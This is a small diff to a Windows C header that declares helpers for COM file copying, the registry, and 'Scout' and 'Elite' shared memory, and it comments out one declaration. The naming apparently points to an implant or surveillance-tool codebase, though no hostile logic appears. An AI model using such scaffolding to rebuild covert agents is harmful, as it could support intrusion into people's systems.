@@ -22,7 +22,7 @@ HRESULT ComCopyFile(__in LPWSTR strSourceFile, __in LPWSTR strDestDir, __in_opt 
 BOOL CreateRegistryKey(HKEY hBaseKey, LPWSTR strSubKey, DWORD dwOptions, DWORD dwPermissions, PHKEY hOutKey);
 HKEY GetRegistryKeyHandle(__in HKEY hParentKey, __in LPWSTR strSubKey, __in DWORD dwSamDesidered);
 BOOL GetRegistryValue(__in HKEY hRootKey, __in LPWSTR strSubKey, __in LPWSTR strKeyName, __out LPVOID lpBuffer, __in DWORD dwBuffSize, __in DWORD dwSam);
-LPWSTR GetScoutSharedMemoryName();
+//LPWSTR GetScoutSharedMemoryName();
 BOOL ExistsEliteSharedMemory();
 BOOL ExistsScoutSharedMemory();
 BOOL CreateScoutSharedMemory();
